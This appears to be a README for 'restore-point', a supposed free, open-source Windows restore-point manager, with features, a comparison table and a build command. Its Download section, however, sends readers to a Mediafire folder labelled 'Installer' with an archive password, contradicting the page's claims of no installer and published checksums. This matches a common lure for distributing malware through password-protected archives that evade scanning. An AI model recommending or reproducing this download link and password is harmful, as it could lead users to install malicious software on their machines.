# restore-point

⏪ Free, open-source restore point manager for Windows — create, schedule and compare system checkpoints offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **One-click checkpoint** — create a named restore point in seconds without digging through System Protection
- ✅ **Auto-schedule** — daily, pre-update or before each detected driver install
- ✅ **Comparison browser** — list points with age, size and the events each one precedes
- ✅ **Retention policy** — cap by count or disk percentage so points never eat the whole drive
- ✅ **Protection status panel** — shows which drives have protection enabled and fixes the disabled ones
- ✅ **Restore from app or boot** — trigger the rollback directly, or export the instructions for WinRE
- ✅ **100 MB self-contained exe** — runtime bundled, portable, offline, MIT with SHA-256 releases

## Why restore-point

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **restore-point** | Restore Point Creator | System Protection | EaseUS Todo Free |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Built-in | Freemium |
| Open source | **Yes** | No | No | No |
| Named one-click points | **Yes** | Yes | Partial | n/a imaging |
| Scheduling with policies | **Yes** | Task scripted | No | Partial |
| Disk usage caps by percent | **Yes** | No | Yes | n/a
| Portable, no install | **Yes, 100 MB** | Installer | With OS | Installer |

## FAQ

**how to create restore points automatically on Windows 10 and 11?**

System Protection is off by default on many systems and its dialog hides frequency, naming and storage caps. restore-point turns checkpoints into a first-class tool: one-click creation, scheduled snapshots before updates and a retention policy that respects disk space. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark timeline (#121418, amber #F59E0B): restore points arranged by date with names and suspected triggers, Create point button top right, disk usage bar at 3 percent.
2. Comparison list: two points selected with event chips (driver install, audit week), size and age columns, delete older action.
3. Protection panel: system drive enabled green, data drive disabled with fix action, retention policy dropdown keep 4 percent of disk.

## Download

| Source | Link |
|---|---|
| 💾 **Installer restore-point** | [Installer restore-point](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).